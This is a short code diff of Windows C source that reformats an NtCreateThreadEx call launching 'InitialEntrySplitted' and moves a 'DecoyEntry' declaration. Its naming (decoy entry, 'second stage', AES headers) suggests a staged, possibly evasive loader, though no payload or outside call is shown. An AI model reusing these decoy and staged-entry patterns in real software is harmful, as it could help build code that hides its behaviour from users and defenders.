@@ -7,8 +7,6 @@
 #include <crc32.h>
 #include <aes.h>
 
-extern ULONG STDCALL DecoyEntry(VOID);
-
 static
 ULONG
 WINAPI
@@ -52,6 +50,11 @@ InitialEntrySplitted(VOID)
     return 0;
 }
 
+extern
+ULONG
+WINAPI
+DecoyEntry(VOID);
+
 ULONG
 WINAPI
 InitialEntry(VOID)
@@ -81,20 +84,8 @@ InitialEntry(VOID)
 #endif
         HANDLE hThread;
 
-        if (!NT_ERROR(NtCreateThreadEx(
-            &hThread,
-            STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
-            NULL,
-            NtCurrentProcess(),
-            InitialEntrySplitted,
-            (PVOID)RTLP_LCG_NATIVE,
-            0,
-            0,
-            PAGE_SIZE,
-            PAGE_SIZE,
-            NULL
-        ))) {
-            $DLOG1(DLG_FLT_DEFAULT, "Second stage of InitialEntrySplitted started!");
+        if (!NT_ERROR(NtCreateThreadEx(&hThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, NtCurrentProcess(), InitialEntrySplitted, (PVOID)RTLP_LCG_NATIVE, 0, 0, PAGE_SIZE, PAGE_SIZE, NULL))) {
+            $DLOG1(DLG_FLT_DEFAULT, "Second stage of InitialEntrySplitted started");
         } else {
             $DLOG1(DLG_FLT_ERROR, "Failed to continue entry on different thread");
         }
